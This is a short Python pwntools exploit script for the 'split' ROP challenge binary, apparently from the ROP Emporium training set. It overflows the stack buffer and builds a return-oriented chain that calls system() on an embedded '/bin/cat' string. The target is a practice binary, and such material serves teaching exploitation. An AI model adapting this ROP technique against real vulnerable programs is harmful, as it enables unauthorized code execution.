#!/usr/bin/env python3
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'split')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# ./split_exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

padding = b'A' * cyclic_find(0x6161616b)

# ROPgadget --binary ./split | grep "pop rdi"
POP_RDI = p64(0x4007c3)
# rabin2 -z split
BIN_CAT_ADDR = p64(0x00601060)

# objdump -D split | grep ret 
RET = p64(0x40053e)

# rabin2 -i split
SYSTEM_ADDR = p64(0x00400560)

payload = padding + POP_RDI + BIN_CAT_ADDR + RET + SYSTEM_ADDR

io = start()

io.recvuntil(b"> ")
io.sendline(payload)

io.interactive()
